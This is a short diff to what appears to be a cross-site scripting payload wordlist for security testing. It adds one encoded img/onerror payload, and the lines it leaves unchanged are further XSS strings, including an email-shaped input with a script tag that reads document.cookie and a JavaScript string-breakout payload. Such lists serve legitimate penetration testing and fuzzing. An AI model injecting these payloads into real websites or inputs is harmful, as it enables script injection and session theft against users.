@@ -1,3 +1,4 @@
+<!--xss"><img+src%3dx+onerror%3dalert(1)>-->
 ">\]<img src=x onerror=alert(document.domain)>
 1@test.com'"0&%<zzz>"<script>alert(document.cookie)</script>@gmail.com
 ";}alert(1);function%20test(){"
